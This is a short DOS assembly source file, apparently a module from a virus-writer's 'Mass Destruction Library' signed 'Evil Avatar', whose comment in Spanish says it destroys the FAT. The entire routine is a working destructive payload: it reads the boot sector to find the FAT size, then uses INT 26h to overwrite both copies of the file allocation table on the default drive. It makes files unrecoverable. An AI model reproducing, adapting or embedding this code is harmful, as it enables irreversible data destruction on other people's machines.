

;FAT_FUCK - module for Mass Destruction Library
;written by Evil Avatar
; Destruye la FAT

fat_fuck:
        push cx
        push bp
        push ax
        push dx               ;save regs that will be changed
        mov ax, 0dh
        int 21h               ;reset disk
        mov ah, 19h
        int 21h               ;get default disk
        xor dx, dx
        call load_sec         ;load boot sector
        mov bp, bx
        mov cx, es:[bp+16h]   ;get number of secs per fat
        add cx, cx
        mov dx, 1
        int 26h               ;fuck both fats
        pop dx
        pop ax
        pop bp
        pop cx
        ret                   ;restore regs and return

